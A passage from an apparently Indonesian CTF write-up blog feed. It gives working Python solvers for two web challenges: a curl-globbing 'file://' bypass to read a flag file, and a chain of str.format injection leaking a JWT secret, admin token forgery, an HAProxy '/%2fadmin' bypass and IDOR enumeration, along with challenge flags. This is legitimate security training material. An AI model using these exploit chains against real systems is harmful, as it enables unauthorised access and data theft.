+    <span class="k">print</span><span class="p">(</span><span class="sa">f</span><span class="s">"[!] Error: </span><span class="si">{</span><span class="n">e</span><span class="si">}</span><span class="s">"</span><span class="p">)</span>
+</pre></td></tr></tbody></table></code></pre></div></div>
+<h4 id="tahap-2">Tahap 2</h4>
+<p>Setelah mendapatkan akses admin, lanjut ke tahap 2 dimana kita memanfaatkan tehnik globbing karena curl bisa menggunakan tehnik globbing https://everything.curl.dev/cmdline/urls/globbing.html hingga menjadi seperti ini</p>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+26
+27
+28
+29
+30
+31
+32
+33
+34
+</pre></td><td class="rouge-code"><pre><span class="kn">import</span> <span class="nn">requests</span>
+
+<span class="n">TGT_URL</span> <span class="o">=</span> <span class="s">"http://localhost:5000"</span>
+
+<span class="k">def</span> <span class="nf">curi_bdra</span><span class="p">():</span>
+    <span class="k">try</span><span class="p">:</span>
+        <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s">"admin_token.txt"</span><span class="p">,</span> <span class="s">"r"</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
+            <span class="n">tkn</span> <span class="o">=</span> <span class="n">f</span><span class="p">.</span><span class="n">read</span><span class="p">().</span><span class="n">strip</span><span class="p">()</span>
+    <span class="k">except</span><span class="p">:</span>
+        <span class="k">return</span> <span class="k">print</span><span class="p">(</span><span class="s">"[-] Token tak ada"</span><span class="p">)</span>
+
+    <span class="n">hdr</span> <span class="o">=</span> <span class="p">{</span><span class="s">'Authorization'</span><span class="p">:</span> <span class="sa">f</span><span class="s">'Bearer </span><span class="si">{</span><span class="n">tkn</span><span class="si">}</span><span class="s">'</span><span class="p">,</span> <span class="s">'Content-Type'</span><span class="p">:</span> <span class="s">'application/json'</span><span class="p">}</span>
+
+    <span class="n">pyld_emas</span> <span class="o">=</span> <span class="s">"fi{l,l}e:///flag.txt"</span>
+    <span class="n">nm_file</span> <span class="o">=</span> <span class="s">"hsl_bdra.txt"</span>
+
+    <span class="n">dt_krm</span> <span class="o">=</span> <span class="p">{</span>
+        <span class="s">"url"</span><span class="p">:</span> <span class="n">pyld_emas</span><span class="p">,</span>
+        <span class="s">"filename"</span><span class="p">:</span> <span class="n">nm_file</span><span class="p">,</span>
+        <span class="s">"title"</span><span class="p">:</span> <span class="s">"pwn"</span><span class="p">,</span>
+        <span class="s">"type"</span><span class="p">:</span> <span class="s">"image"</span>
+    <span class="p">}</span>
+
+    <span class="k">print</span><span class="p">(</span><span class="sa">f</span><span class="s">"[*] Kirim pyld: </span><span class="si">{</span><span class="n">pyld_emas</span><span class="si">}</span><span class="s">"</span><span class="p">)</span>
+    <span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="n">post</span><span class="p">(</span><span class="sa">f</span><span class="s">"</span><span class="si">{</span><span class="n">TGT_URL</span><span class="si">}</span><span class="s">/api/admin/download"</span><span class="p">,</span> <span class="n">headers</span><span class="o">=</span><span class="n">hdr</span><span class="p">,</span> <span class="n">json</span><span class="o">=</span><span class="n">dt_krm</span><span class="p">)</span>
+
+    <span class="k">if</span> <span class="n">r</span><span class="p">.</span><span class="n">status_code</span> <span class="o">==</span> <span class="mi">200</span><span class="p">:</span>
+        <span class="k">print</span><span class="p">(</span><span class="s">"[+] Sukses bypass filter!"</span><span class="p">)</span>
+        <span class="n">r_cek</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="n">get</span><span class="p">(</span><span class="sa">f</span><span class="s">"</span><span class="si">{</span><span class="n">TGT_URL</span><span class="si">}</span><span class="s">/static/</span><span class="si">{</span><span class="n">nm_file</span><span class="si">}</span><span class="s">"</span><span class="p">)</span>
+        <span class="k">print</span><span class="p">(</span><span class="sa">f</span><span class="s">"</span><span class="se">\n</span><span class="s">[!!!] FLAG:</span><span class="se">\n</span><span class="si">{</span><span class="n">r_cek</span><span class="p">.</span><span class="n">text</span><span class="si">}</span><span class="s">"</span><span class="p">)</span>
+    <span class="k">else</span><span class="p">:</span>
+        <span class="k">print</span><span class="p">(</span><span class="s">"[-] Gagal"</span><span class="p">)</span>
+
+<span class="n">curi_bdra</span><span class="p">()</span>
+</pre></td></tr></tbody></table></code></pre></div></div>
+<p>hingga mengeluarkan flag seperti ini
+<img src="/assets/img/c2cctf/1.png" alt="Gambar 2" /></p>
+<blockquote>
+  <p>flag : C2C{p4rs3r_d1sr4p4ncy_4nd_curl_gl0bb1ng_1s_my_f4v0r1t3_0f89c517a261}</p>
+</blockquote>
+
+<h2 id="corp-mail">Corp Mail</h2>
+<h3 id="initial-analisis">initial analisis</h3>
+<p>ini adalah file yang di berikan</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+26
+27
+28
+29
+30
+31
+32
+33
+34
+35
+36
+37
+38
+39
+40
+41
+42
+43
+44
+45
+46
+47
+48
+49
+50
+51
+52
+</pre></td><td class="rouge-code"><pre>└─<span class="nv">$ </span>tree
+<span class="nb">.</span>
+├── docker-compose.yml
+├── Dockerfile
+├── flask_app
+│   ├── application
+│   │   ├── auth.py
+│   │   ├── config.py
+│   │   ├── db.py
+│   │   ├── gunicorn.ctl
+│   │   ├── __init__.py
+│   │   ├── __pycache__
+│   │   │   ├── auth.cpython-313.pyc
+│   │   │   ├── config.cpython-313.pyc
+│   │   │   ├── db.cpython-313.pyc
+│   │   │   ├── __init__.cpython-313.pyc
+│   │   │   └── utils.cpython-313.pyc
+│   │   ├── routes
+│   │   │   ├── admin.py
+│   │   │   ├── auth.py
+│   │   │   ├── __init__.py
+│   │   │   ├── __pycache__
+│   │   │   │   ├── admin.cpython-313.pyc
+│   │   │   │   ├── auth.cpython-313.pyc
+│   │   │   │   ├── __init__.cpython-313.pyc
+│   │   │   │   └── user.cpython-313.pyc
+│   │   │   └── user.py
+│   │   ├── static
+│   │   │   └── style.css
+│   │   ├── templates
+│   │   │   ├── admin_emails.html
+│   │   │   ├── admin.html
+│   │   │   ├── base.html
+│   │   │   ├── compose.html
+│   │   │   ├── email.html
+│   │   │   ├── inbox.html
+│   │   │   ├── login.html
+│   │   │   ├── register.html
+│   │   │   ├── sent.html
+│   │   │   └── settings.html
+│   │   └── utils.py
+│   ├── app.py
+│   ├── data
+│   │   └── corporate.db
+│   ├── __pycache__
+│   │   └── app.cpython-313.pyc
+│   └── requirements.txt
+├── haproxy
+│   └── haproxy.cfg
+├── run.sh
+├── s.py
+├── supervisord.conf
+</pre></td></tr></tbody></table></code></pre></div></div>
+<p>dari file ini kita bisa melihat di sana ada haproxy</p>
+<h3 id="find-vuln-1">Find vuln</h3>
+<h4 id="celah-pertama">celah pertama</h4>
+<p>pada file <code class="language-plaintext highlighter-rouge">file haproxy.cfg</code> terdapat aturan yang memblokir semua akses ke direktori /admin</p>
+<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+</pre></td><td class="rouge-code"><pre><span class="n">backend</span> <span class="n">flask_backend</span>
+    <span class="n">http</span><span class="o">-</span><span class="n">request</span> <span class="n">deny</span> <span class="k">if</span> <span class="p">{</span> <span class="n">path</span> <span class="o">-</span><span class="n">i</span> <span class="o">-</span><span class="n">m</span> <span class="n">beg</span> <span class="o">/</span><span class="n">admin</span> <span class="p">}</span>
+    <span class="n">server</span> <span class="n">flask1</span> <span class="mf">127.0</span><span class="p">.</span><span class="mf">0.1</span><span class="p">:</span><span class="mi">5000</span> <span class="n">check</span>
+</pre></td></tr></tbody></table></code></pre></div></div>
+<p>Artinya, HAProxy akan menolak (403 Forbidden) request apa pun yang path-nya dimulai dengan string <code class="language-plaintext highlighter-rouge">/admin</code></p>
+<h4 id="celah-kedua">celah kedua</h4>
+<p>Pada file <code class="language-plaintext highlighter-rouge">utils.py</code>, terdapat fungsi format_signature yang digunakan saat user memperbarui signature email mereka di menu Settings:</p>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+</pre></td><td class="rouge-code"><pre><span class="k">def</span> <span class="nf">format_signature</span><span class="p">(</span><span class="n">signature_template</span><span class="p">,</span> <span class="n">username</span><span class="p">):</span>
+    <span class="n">now</span> <span class="o">=</span> <span class="n">datetime</span><span class="p">.</span><span class="n">now</span><span class="p">()</span>
+    <span class="k">try</span><span class="p">:</span>
+        <span class="k">return</span> <span class="n">signature_template</span><span class="p">.</span><span class="nb">format</span><span class="p">(</span>
+            <span class="n">username</span><span class="o">=</span><span class="n">username</span><span class="p">,</span>
+            <span class="n">date</span><span class="o">=</span><span class="n">now</span><span class="p">.</span><span class="n">strftime</span><span class="p">(</span><span class="s">'%Y-%m-%d'</span><span class="p">),</span>
+            <span class="n">app</span><span class="o">=</span><span class="n">current_app</span>
+        <span class="p">)</span>
+</pre></td></tr></tbody></table></code></pre></div></div>
+<p>Fungsi <code class="language-plaintext highlighter-rouge">str.format()</code> bawaan Python sangat berbahaya jika format string-nya dikontrol oleh pengguna. Terlebih lagi, developer melewatkan objek <code class="language-plaintext highlighter-rouge">app=current_app</code> ke dalamnya. Ini memungkinkan kita untuk membaca atribut apa pun dari objek aplikasi Flask, termasuk kamus konfigurasi <code class="language-plaintext highlighter-rouge">(app.config)</code>.</p>
+<h4 id="celah-ketiga">celah ketiga</h4>
+<p>Pada <code class="language-plaintext highlighter-rouge">auth.py</code>, aplikasi menggunakan stateless authentication berbasis JWT. Jika kita bisa mendapatkan nilai JWT_SECRET dari file konfigurasi, kita bisa membuat token palsu dengan hak akses <code class="language-plaintext highlighter-rouge">is_admin = True</code>.</p>
+<h3 id="exploit">exploit</h3>
+<h4 id="tahap-1-membocorkan-jwt-secret-ssti">Tahap 1: Membocorkan JWT Secret (SSTI)</h4>
+<p>dengan menggunakan payload</p>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre></td><td class="rouge-code"><pre><span class="n">SSTI_START</span><span class="p">{</span><span class="n">app</span><span class="p">.</span><span class="n">config</span><span class="p">[</span><span class="n">JWT_SECRET</span><span class="p">]}</span><span class="n">SSTI_END</span>
+</pre></td></tr></tbody></table></code></pre></div></div>
+<p>Ketika signature disimpan, fungsi format() Python akan mengevaluasi {app.config[JWT_SECRET]} dan menggantinya dengan nilai secret 64-karakter Hex yang di-generate oleh server. Kita berhasil mendapatkan kunci enkripsinya!</p>
+<h4 id="tahap-2-forging-admin-jwt-privilege-escalation">Tahap 2: Forging Admin JWT (Privilege Escalation)</h4>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+</pre></td><td class="rouge-code"><pre><span class="p">{</span>
+  <span class="s">"user_id"</span><span class="p">:</span> <span class="mi">1</span><span class="p">,</span>
+  <span class="s">"username"</span><span class="p">:</span> <span class="s">"admin"</span><span class="p">,</span>
+  <span class="s">"is_admin"</span><span class="p">:</span> <span class="mi">1</span><span class="p">,</span>
+  <span class="s">"exp"</span><span class="p">:</span> <span class="o">&lt;</span><span class="n">timestamp</span><span class="o">&gt;</span>
+<span class="p">}</span>
+</pre></td></tr></tbody></table></code></pre></div></div>
+<p>Kita men- generate token ini secara lokal menggunakan algoritma HS256 dan secret yang baru saja dibocorkan. Sekarang kita memiliki akses admin yang sah secara logika aplikasi.</p>
+<h4 id="tahap-3-membypass-haproxy">Tahap 3: Membypass HAProxy</h4>
+<p>dengan menggunakan <code class="language-plaintext highlighter-rouge">/%2fadmin/email/1</code></p>
+<h4 id="tahap-4-idor">Tahap 4: IDOR</h4>
+<p>arena aplikasi tidak memvalidasi kepemilikan email secara ketat di route admin, kita cukup menggunakan looping (Brute-force ID) dari 1 hingga 15 ke endpoint <code class="language-plaintext highlighter-rouge">/%2fadmin/email/{id}</code> dengan melampirkan Header Cookie token admin kita. Flag ditemukan di dalam salah satu pesan email tersebut.</p>
+<h4 id="solver">solver</h4>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+26
+27
+28
+29
+30
+31
+32
+33
+34
+35
+36
+37
+38
+39
+40
+41
+42
+43
+44
+45
+46
+47
+48
+49
+50
+51
+52
+53
+54
+55
+</pre></td><td class="rouge-code"><pre><span class="kn">import</span> <span class="nn">requests</span><span class="p">,</span> <span class="n">jwt</span><span class="p">,</span> <span class="n">time</span><span class="p">,</span> <span class="n">re</span><span class="p">,</span> <span class="n">random</span><span class="p">,</span> <span class="n">string</span><span class="p">,</span> <span class="n">sys</span>
+
+<span class="k">def</span> <span class="nf">rand</span><span class="p">(</span><span class="n">n</span><span class="o">=</span><span class="mi">6</span><span class="p">):</span>
+    <span class="k">return</span> <span class="s">''</span><span class="p">.</span><span class="n">join</span><span class="p">(</span><span class="n">random</span><span class="p">.</span><span class="n">choices</span><span class="p">(</span><span class="n">string</span><span class="p">.</span><span class="n">ascii_lowercase</span><span class="o">+</span><span class="n">string</span><span class="p">.</span><span class="n">digits</span><span class="p">,</span><span class="n">k</span><span class="o">=</span><span class="n">n</span><span class="p">))</span>
+
+<span class="n">BASE_URL</span> <span class="o">=</span> <span class="s">"http://localhost:8080"</span>
+
+<span class="n">s</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="n">Session</span><span class="p">()</span>
+<span class="n">user</span> <span class="o">=</span> <span class="sa">f</span><span class="s">"user_</span><span class="si">{</span><span class="n">rand</span><span class="p">()</span><span class="si">}</span><span class="s">"</span>
+<span class="n">pw</span> <span class="o">=</span> <span class="s">"password123"</span>
+
+<span class="c1"># 1. Register + login
+</span>
+<span class="n">s</span><span class="p">.</span><span class="n">post</span><span class="p">(</span><span class="sa">f</span><span class="s">"</span><span class="si">{</span><span class="n">BASE_URL</span><span class="si">}</span><span class="s">/register"</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="p">{</span>
+    <span class="s">"username"</span><span class="p">:</span> <span class="n">user</span><span class="p">,</span>
+    <span class="s">"email"</span><span class="p">:</span> <span class="sa">f</span><span class="s">"</span><span class="si">{</span><span class="n">user</span><span class="si">}</span><span class="s">@corp.local"</span><span class="p">,</span>
+    <span class="s">"password"</span><span class="p">:</span> <span class="n">pw</span><span class="p">,</span>
+    <span class="s">"confirm_password"</span><span class="p">:</span> <span class="n">pw</span>
+    <span class="p">})</span>
+<span class="n">s</span><span class="p">.</span><span class="n">post</span><span class="p">(</span><span class="sa">f</span><span class="s">"</span><span class="si">{</span><span class="n">BASE_URL</span><span class="si">}</span><span class="s">/login"</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="p">{</span><span class="s">"username"</span><span class="p">:</span> <span class="n">user</span><span class="p">,</span> <span class="s">"password"</span><span class="p">:</span> <span class="n">pw</span><span class="p">})</span>
+
+<span class="k">if</span> <span class="s">"token"</span> <span class="ow">not</span> <span class="ow">in</span> <span class="n">s</span><span class="p">.</span><span class="n">cookies</span><span class="p">:</span>
+    <span class="nb">exit</span><span class="p">(</span><span class="s">"[-] Login gagal"</span><span class="p">)</span>
+
+
+<span class="n">payload</span> <span class="o">=</span> <span class="s">"X{app.config[JWT_SECRET]}Y"</span>
+<span class="n">r</span> <span class="o">=</span> <span class="n">s</span><span class="p">.</span><span class="n">post</span><span class="p">(</span><span class="sa">f</span><span class="s">"</span><span class="si">{</span><span class="n">BASE_URL</span><span class="si">}</span><span class="s">/settings"</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="p">{</span><span class="s">"signature"</span><span class="p">:</span> <span class="n">payload</span><span class="p">})</span>
+
+<span class="n">m</span> <span class="o">=</span> <span class="n">re</span><span class="p">.</span><span class="n">search</span><span class="p">(</span><span class="sa">r</span><span class="s">'X(.*?)Y'</span><span class="p">,</span> <span class="n">r</span><span class="p">.</span><span class="n">text</span><span class="p">)</span>
+<span class="k">if</span> <span class="ow">not</span> <span class="n">m</span><span class="p">:</span>
+    <span class="nb">exit</span><span class="p">(</span><span class="s">"[-] SSTI gagal"</span><span class="p">)</span>
+
+<span class="n">secret</span> <span class="o">=</span> <span class="n">m</span><span class="p">.</span><span class="n">group</span><span class="p">(</span><span class="mi">1</span><span class="p">).</span><span class="n">strip</span><span class="p">()</span>
+<span class="k">print</span><span class="p">(</span><span class="sa">f</span><span class="s">"[+] Secret: </span><span class="si">{</span><span class="n">secret</span><span class="si">}</span><span class="s">"</span><span class="p">)</span>
+
+<span class="c1"># 3. Forge admin JWT
+</span>
+<span class="n">tok</span> <span class="o">=</span> <span class="n">jwt</span><span class="p">.</span><span class="n">encode</span><span class="p">({</span>
+    <span class="s">"user_id"</span><span class="p">:</span><span class="mi">1</span><span class="p">,</span>
+    <span class="s">"username"</span><span class="p">:</span><span class="s">"admin"</span><span class="p">,</span>
+    <span class="s">"is_admin"</span><span class="p">:</span><span class="mi">1</span><span class="p">,</span>
+    <span class="s">"exp"</span><span class="p">:</span><span class="nb">int</span><span class="p">(</span><span class="n">time</span><span class="p">.</span><span class="n">time</span><span class="p">())</span><span class="o">+</span><span class="mi">86400</span>
+<span class="p">},</span> <span class="n">secret</span><span class="p">,</span> <span class="n">algorithm</span><span class="o">=</span><span class="s">"HS256"</span><span class="p">)</span>
+
+
+<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="mi">15</span><span class="p">):</span>
+    <span class="n">url</span> <span class="o">=</span> <span class="sa">f</span><span class="s">"</span><span class="si">{</span><span class="n">BASE_URL</span><span class="si">}</span><span class="s">/%2fadmin/email/</span><span class="si">{</span><span class="n">i</span><span class="si">}</span><span class="s">"</span>
+    <span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="n">get</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">headers</span><span class="o">=</span><span class="p">{</span><span class="s">"Cookie"</span><span class="p">:</span><span class="sa">f</span><span class="s">"token=</span><span class="si">{</span><span class="n">tok</span><span class="si">}</span><span class="s">"</span><span class="p">})</span>
+    <span class="k">print</span><span class="p">(</span><span class="sa">f</span><span class="s">"[&gt;] Email </span><span class="si">{</span><span class="n">i</span><span class="si">}</span><span class="s">: </span><span class="si">{</span><span class="n">r</span><span class="p">.</span><span class="n">status_code</span><span class="si">}</span><span class="s">"</span><span class="p">)</span>
+
+    <span class="k">if</span> <span class="s">"C2C{"</span> <span class="ow">in</span> <span class="n">r</span><span class="p">.</span><span class="n">text</span><span class="p">:</span>
+        <span class="n">flag</span> <span class="o">=</span> <span class="n">re</span><span class="p">.</span><span class="n">search</span><span class="p">(</span><span class="sa">r</span><span class="s">'(C2C\{.*?\})'</span><span class="p">,</span> <span class="n">r</span><span class="p">.</span><span class="n">text</span><span class="p">).</span><span class="n">group</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+        <span class="k">print</span><span class="p">(</span><span class="n">flag</span><span class="p">)</span>
+        <span class="k">break</span>
+
+</pre></td></tr></tbody></table></code></pre></div></div>
+<p><img src="/assets/img/c2cctf/2.png" alt="Gambar 2" /></p>
+<blockquote>
+  <p>flag : C2C{f0rm4t_str1ng_l34k5_4nd_n0rm4l1z4t10n_fc0b7f7463de}</p>
+</blockquote>]]></content><author><name>ilupii</name></author><category term="combined" /><category term="web" /><category term="forensic" /><category term="pwn" /><category term="misc" /><category term="rev" /><summary type="html"><![CDATA[striving to be among the top 100]]></summary></entry><entry><title type="html">Understanding One-Byte Arbitrary Writes</title><link href="http://localhost:4000/writeups/2026/understanding-one-byte-arbitrary-writes/" rel="alternate" type="text/html" title="Understanding One-Byte Arbitrary Writes" /><published>2026-04-20T13:13:20+08:00</published><updated>2026-04-20T13:13:20+08:00</updated><id>http://localhost:4000/writeups/2026/understanding-one-byte-arbitrary-writes</id><content type="html" xml:base="http://localhost:4000/writeups/2026/understanding-one-byte-arbitrary-writes/"><![CDATA[<ul id="markdown-toc">
   <li><a href="#description" id="markdown-toc-description">Description</a></li>
   <li><a href="#initial-analysis" id="markdown-toc-initial-analysis">Initial Analysis</a></li>
   <li><a href="#code-analysis" id="markdown-toc-code-analysis">Code Analysis</a>    <ul>
